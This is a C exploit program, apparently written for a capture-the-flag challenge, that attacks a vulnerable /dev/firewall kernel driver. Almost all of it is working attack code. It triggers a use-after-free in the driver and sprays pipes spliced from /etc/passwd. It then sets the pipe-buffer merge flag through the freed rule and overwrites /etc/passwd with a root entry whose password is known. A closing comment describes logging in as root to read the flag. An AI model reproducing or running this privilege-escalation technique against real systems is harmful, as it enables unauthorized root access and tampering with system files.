#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define FW_ADD_RULE    _IOW('F', 1, struct fw_add_req)
#define FW_DEL_RULE    _IOW('F', 2, int)
#define FW_EDIT_RULE   _IOW('F', 3, struct fw_edit_req)
#define FW_SHOW_RULE   _IOR('F', 4, struct fw_show_req)

#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define SPRAY_PIPES 200

struct fw_add_req { char rule_str[256]; };
struct fw_edit_req { int idx; size_t offset; size_t len; char data[1024]; };
struct fw_show_req { int idx; size_t offset; size_t len; char data[1024]; };

int pipe_fds[SPRAY_PIPES][2];

void fw_edit(int fd, int idx, size_t offset, void *data, size_t len) {
    struct fw_edit_req req = {0};
    req.idx = idx;
    req.offset = offset;
    req.len = len;
    memcpy(req.data, data, len);
    ioctl(fd, FW_EDIT_RULE, &req);
}

char *pwd = "oot:$1$root$c1pi5nHqxDexgFYdvJoZB.:0:0:root:/root:/bin/sh\nctf:x:1000:1000::/home/ctf:/bin/sh\n";

int main() {
    int fd, idx;
    struct fw_add_req add_req;

    fd = open("/dev/firewall", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    int passwd_fd = open("/etc/passwd", O_RDONLY);

    // UAF
    strcpy(add_req.rule_str, "192.168.1.1 10.0.0.1 80 1 Test");
    idx = ioctl(fd, FW_ADD_RULE, &add_req);
    ioctl(fd, FW_DEL_RULE, (unsigned long)idx);
    printf("[+] UAF at idx %d\n", idx);

    // pipe spray + splice
    for (int i = 0; i < SPRAY_PIPES; i++) {
        pipe(pipe_fds[i]);
        loff_t off = 0;
        splice(passwd_fd, &off, pipe_fds[i][1], NULL, 1, 0);
    }
    printf("[+] Spray done\n");

    // Set CAN_MERGE at pipe_buffer[0]
    uint32_t flags = PIPE_BUF_FLAG_CAN_MERGE;
    fw_edit(fd, idx, 0x18, &flags, 4);

    // Write pipe 0
    printf("\n[*] Writing to pipe 0 ...\n");
    ssize_t bytes = write(pipe_fds[0][1], pwd, strlen(pwd));
    printf("[*] write returned %zd\n", bytes);

    // Check /etc/passwd
    printf("\n===== /etc/passwd content =====\n");
    char check[256] = {0};
    int cfd = open("/etc/passwd", O_RDONLY);
    read(cfd, check, sizeof(check) - 1);
    close(cfd);

    // cleanup
    for (int i = 0; i < SPRAY_PIPES; i++) {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
    }
    close(passwd_fd);
    close(fd);
    
    return 0;
}
// after this exploit, root password is reset to 'pwn'; just `su root` with it and `cat /flag.txt`